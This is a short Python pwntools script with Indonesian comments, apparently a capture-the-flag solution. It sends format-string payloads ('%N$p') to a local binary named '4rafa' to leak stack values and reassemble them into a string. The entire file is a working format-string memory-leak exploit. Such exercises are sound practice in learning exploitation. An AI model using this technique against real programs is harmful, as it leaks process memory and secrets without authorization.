from pwn import *

def get_string_at_offset(offset):
    p = process("4rafa")
    payload = f"%{offset}$p".encode()
    p.sendline(payload)
    output = p.recvline().strip()
    p.close()
    
    if b'0x' in output:
        hex_val = output.decode().replace('0x', '')
        try:
            # Convert dari little endian dan decode ke ASCII
            hex_bytes = bytes.fromhex(hex_val)
            ascii_text = hex_bytes[::-1]  # reverse karena little endian
            return ascii_text
        except:
            # Jika gagal decode sebagai string, coba sebagai integer
            try:
                val = int(hex_val, 16)
                return str(val).encode()
            except:
                return None
    return None

def main():
    # List untuk menyimpan string yang sudah didecode
    decoded_strings = []
    
    for offset in range(0, 100):
        result = get_string_at_offset(offset)
        if result:
            decoded_strings.append(result)
            print(f"Offset {offset}: {result}") 
    
    # Gabungkan semua string
    complete_string = b''.join(decoded_strings)
    print("\nComplete string:", complete_string.decode())

main()